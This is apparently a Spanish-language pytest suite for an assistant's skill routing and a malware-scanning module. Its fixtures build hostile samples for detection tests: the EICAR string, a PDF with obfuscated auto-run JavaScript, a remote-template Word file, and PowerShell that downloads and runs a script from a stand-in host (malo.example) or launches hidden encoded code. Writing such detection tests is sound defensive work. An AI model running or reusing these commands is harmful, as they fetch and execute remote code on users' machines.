"""Pruebas de skills y de la revisión de archivos."""

import asyncio
import zipfile
from pathlib import Path
from types import SimpleNamespace as NS

import httpx
import pytest
from fastapi.testclient import TestClient

from asistente_core.agent import skills
from asistente_core.seguridad import analisis
from asistente_core.tools import seguridad as tseg

from .test_core import _embed_falso, _parte

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
REGLAS = analisis.Reglas([analisis.REGLAS_MONI])


def _analizar(ruta: Path) -> analisis.Informe:
    return analisis.analizar(ruta, REGLAS, usar_defender=False, consultar_internet=False)


def _detalles(inf: analisis.Informe) -> str:
    return " | ".join(h["detalle"] for h in inf.hallazgos)


# ---------------------------------------------------------------- skills


def test_skills_incluidas_se_leen_bien():
    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    nombres = {k.nombre for k in s.todas()}
    assert {"revisar-archivo", "revisar-descargas", "pc-lenta", "copias-de-seguridad"} <= nombres
    for k in s.todas():
        assert len(k.ejemplos) >= 5 and k.pasos and k.titulo


def test_skill_elegida_por_parecido_y_las_tuyas_ganan(tmp_path, monkeypatch):
    propia = tmp_path / "revisar-archivo"
    propia.mkdir()
    (propia / "SKILL.md").write_text(
        "---\nname: revisar-archivo\ntitle: Mi versión\nexamples:\n  - revisa este archivo\n---\n"
        "1. Paso propio.\n",
        encoding="utf-8",
    )
    s = skills.Skills([skills.INCLUIDAS, tmp_path], _embed_falso)
    monkeypatch.setattr(skills, "UMBRAL", 0.5)
    candidatas = s.candidatas("revisa este archivo por favor")
    assert candidatas and candidatas[0].titulo == "Mi versión"
    assert s.candidatas("cuéntame un chiste de gatos") == []
    elegida = candidatas[0]
    msg = skills.mensaje_skill(elegida)
    assert msg["role"] == "system" and "Paso propio" in msg["content"]


def test_websocket_avisa_y_pasa_la_skill(monkeypatch):
    import asistente_core.main as m
    from asistente_core.memory.historial import Historial

    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    monkeypatch.setattr(skills, "UMBRAL", 0.5)
    skills.usar(s)
    vistos = []

    async def falso_stream(mensajes, tools):
        vistos.append(list(mensajes))
        yield _parte("Listo.")

    async def nunca(texto, anterior=""):
        raise AssertionError("con una skill activa no se decide investigar")

    async def la_primera(texto, candidatas):
        assert candidatas
        return candidatas[0]

    real = m.responder
    monkeypatch.setattr(
        m, "responder", lambda ctx, turno, confirmar: real(ctx, turno, falso_stream, confirmar)
    )
    monkeypatch.setattr(m, "necesita_internet", nunca)
    monkeypatch.setattr(m, "elegir_skill", la_primera)
    monkeypatch.setattr(m, "historial", Historial(":memory:"))
    try:
        with TestClient(m.app).websocket_connect("/ws") as ws:
            ws.receive_json()
            ws.send_json({"type": "chat", "text": "revisa mis descargas"})
            ev = ws.receive_json()
            assert ev == {
                "type": "skill",
                "name": "revisar-descargas",
                "title": "Revisar una carpeta",
            }
            assert ws.receive_json()["type"] == "token"
            assert ws.receive_json()["type"] == "done"
        assert "revisar_carpeta" in vistos[0][-2]["content"]
    finally:
        skills.usar(None)


# ---------------------------------------------------------------- revisión de archivos


def test_eicar_es_peligroso(tmp_path):
    p = tmp_path / "prueba.txt"
    p.write_bytes(EICAR)
    inf = _analizar(p)
    assert inf.veredicto == "peligroso" and "EICAR" in _detalles(inf)
    assert len(inf.sha256) == 64


def test_doble_extension_y_programa_disfrazado(tmp_path):
    p = tmp_path / "factura.pdf.exe"
    p.write_bytes(b"MZ" + b"\x00" * 200)
    inf = _analizar(p)
    assert inf.veredicto == "peligroso"
    assert "Doble extensión" in _detalles(inf)
    # pefile no puede leer este .exe falso: se anota y se sigue
    assert any("programa" in n for n in inf.no_revisado)

    q = tmp_path / "foto.jpg"
    q.write_bytes(b"MZ" + b"\x00" * 200)
    assert "en realidad es un programa" in _detalles(_analizar(q))

    r = tmp_path / ("contrato" + chr(0x202E) + "fdp.exe")
    r.write_bytes(b"MZ")
    assert "invisibles" in _detalles(_analizar(r))


def test_pdf_con_javascript_ofuscado(tmp_path):
    p = tmp_path / "doc.pdf"
    p.write_bytes(
        b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
        b"2 0 obj << /S /J#61vaScript /JS (app.alert(1)) >> endobj\n%%EOF"
    )
    c = analisis.contar_pdf(p.read_bytes())
    assert c["JavaScript"] == 1 and c["OpenAction"] == 1
    inf = _analizar(p)
    assert inf.veredicto == "peligroso" and "JavaScript" in _detalles(inf)

    limpio = tmp_path / "limpio.pdf"
    limpio.write_bytes(b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF")
    assert _analizar(limpio).veredicto == "sin hallazgos"


def _docx(ruta: Path, rels: str = "") -> None:
    with zipfile.ZipFile(ruta, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document>Hola</w:document>")
        if rels:
            z.writestr("word/_rels/settings.xml.rels", rels)


def test_word_limpio_y_con_plantilla_remota(tmp_path):
    limpio = tmp_path / "carta.docx"
    _docx(limpio)
    inf = _analizar(limpio)
    assert inf.tipo == "documento de Word" and inf.veredicto == "sin hallazgos"
    assert "No tiene macros" in inf.datos

    malo = tmp_path / "cv.docx"
    _docx(
        malo,
        '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/attachedTemplate" Target="http://malo.example/t.dotm" '
        'TargetMode="External"/></Relationships>',
    )
    inf = _analizar(malo)
    assert inf.veredicto == "peligroso" and "plantilla" in _detalles(inf)


def test_macros_que_se_ejecutan_solas(tmp_path, monkeypatch):
    class VBAFalso:
        def __init__(self, ruta):
            pass

        def detect_vba_macros(self):
            return True

        def detect_xlm_macros(self):
            return False

        def analyze_macros(self):
            return [
                ("AutoExec", "Document_Open", ""),
                ("Suspicious", "Shell", ""),
                ("IOC", "http://malo.example/x.exe", ""),
            ]

        def close(self):
            pass

    import oletools.olevba

    monkeypatch.setattr(oletools.olevba, "VBA_Parser", VBAFalso)
    inf = analisis.Informe("x.docm")
    analisis.revisar_office(Path("x.docm"), inf)
    assert inf.veredicto == "peligroso"
    assert "malo.example" in _detalles(inf)


def test_zip_con_ejecutable_y_scripts(tmp_path):
    z = tmp_path / "fotos.zip"
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("foto1.jpg", b"\xff\xd8\xff")
        f.writestr("ver_fotos.scr", b"MZ")
    assert "ver_fotos.scr" in _detalles(_analizar(z))

    s = tmp_path / "actualizar.ps1"
    s.write_text(
        "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://malo.example/a.ps1')"
    )
    inf = _analizar(s)
    assert inf.veredicto == "sospechoso" and "Descarga código" in _detalles(inf)

    b = tmp_path / "abrir.bat"
    b.write_text("powershell -w hidden -enc " + "A" * 60)
    assert "PowerShell" in _detalles(_analizar(b))


def test_texto_normal_sin_hallazgos(tmp_path):
    p = tmp_path / "notas.txt"
    p.write_text("Comprar pan, leche y café.\nLlamar a mamá.")
    inf = _analizar(p)
    assert inf.veredicto == "sin hallazgos" and "nota" in inf.como_dict()


def test_reglas_propias_del_usuario(tmp_path):
    (tmp_path / "mias.yar").write_text(
        'rule Palabra { meta: severity = "high" description = "Palabra prohibida" '
        'strings: $a = "pikachu" condition: $a }'
    )
    (tmp_path / "rota.yar").write_text("rule { esto no compila")
    reglas = analisis.Reglas([analisis.REGLAS_MONI, tmp_path])
    p = tmp_path / "x.txt"
    p.write_text("hola pikachu")
    inf = analisis.analizar(p, reglas, usar_defender=False, consultar_internet=False)
    assert inf.veredicto == "peligroso" and "Palabra prohibida" in _detalles(inf)
    assert reglas.errores and "rota.yar" in reglas.errores[0]


def test_consulta_solo_el_hash():
    pedidos = []

    def api(req: httpx.Request) -> httpx.Response:
        pedidos.append(req)
        if "circl" in req.url.host:
            return httpx.Response(404)
        return httpx.Response(
            200, json={"query_status": "ok", "data": [{"signature": "AgentTesla"}]}
        )

    cliente = httpx.Client(transport=httpx.MockTransport(api))
    r = analisis.consultar_hash("ab" * 32, "clave", cliente)
    assert r == {"conocido": None, "malware": "AgentTesla"}
    assert pedidos[1].headers["Auth-Key"] == "clave"
    assert all(len(p.content) < 200 for p in pedidos)  # nunca se envía el archivo


# ---------------------------------------------------------------- rutas


def test_resolver_rutas(tmp_path):
    descargas = tmp_path / "Downloads"
    (descargas / "sub").mkdir(parents=True)
    (descargas / "factura.pdf").write_bytes(b"%PDF")
    (descargas / "sub" / "contrato.docx").write_bytes(b"PK")
    (tmp_path / "Desktop").mkdir()
    assert tseg.resolver("factura.pdf", home=tmp_path) == descargas / "factura.pdf"
    assert tseg.resolver("Descargas/factura.pdf", home=tmp_path) == descargas / "factura.pdf"
    assert tseg.resolver("contrato.docx", home=tmp_path).name == "contrato.docx"
    assert tseg.resolver(str(descargas / "factura.pdf")) == descargas / "factura.pdf"
    assert tseg.resolver("descargas", home=tmp_path) == descargas
    with pytest.raises(ValueError, match="Quizás"):
        tseg.resolver("factura.pd", home=tmp_path)
    with pytest.raises(ValueError, match="No encontré"):
        tseg.resolver("nada-que-ver.xyz", home=tmp_path)


def test_revisar_carpeta(tmp_path, monkeypatch):
    (tmp_path / "Downloads").mkdir()
    (tmp_path / "Downloads" / "a.txt").write_bytes(EICAR)
    (tmp_path / "Downloads" / "b.txt").write_text("hola")
    monkeypatch.setattr(tseg, "_HOME", tmp_path)
    monkeypatch.setattr(
        tseg, "carpeta_conocida", lambda n, home=tmp_path: tseg.CARPETAS and tmp_path / "Downloads"
    )
    r = tseg.revisar_carpeta("descargas")
    assert r["revisados"] == 2 and r["resumen"]["peligroso"] == 1
    assert r["archivos"][0]["archivo"] == "a.txt"


def test_clasificador_de_skills(monkeypatch):
    """El modelo confirma la skill; si dice "ninguna" o falla, no se usa ninguna."""
    from asistente_core.agent import router

    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    cands = [k for k in s.todas() if k.nombre in ("revisar-archivo", "pc-lenta")]
    respuestas = iter(['{"skill": "pc-lenta"}', '{"skill": "ninguna"}'])
    pedidos = []

    class Falso:
        async def chat(self, **kw):
            pedidos.append(kw)
            return NS(message=NS(content=next(respuestas)))

    monkeypatch.setattr(router, "_client", Falso())
    elegida = asyncio.run(router.elegir_skill("la pc va lenta", cands))
    assert elegida.nombre == "pc-lenta"
    assert asyncio.run(router.elegir_skill("¿qué es un virus?", cands)) is None
    enum = pedidos[0]["format"]["properties"]["skill"]["enum"]
    assert set(enum) == {"revisar-archivo", "pc-lenta", "ninguna"}
    assert asyncio.run(router.elegir_skill("x", [])) is None


def test_firma_valida_quita_pistas_debiles():
    inf = analisis.Informe("x.exe")
    inf.datos.append("No tiene firma digital")
    inf.hallar("baja", "Importa muy pocas funciones")
    inf.hallar("media", "Algo serio")
    analisis.anotar_firma(
        {"estado": "Valid", "firmante": "CN=Microsoft Corporation, O=Microsoft"}, inf
    )
    assert [h["gravedad"] for h in inf.hallazgos] == ["media"]
    assert inf.datos == ["Firma digital válida de Microsoft Corporation"]
    analisis.anotar_firma({"estado": "HashMismatch", "firmante": ""}, inf)
    assert inf.veredicto == "peligroso"
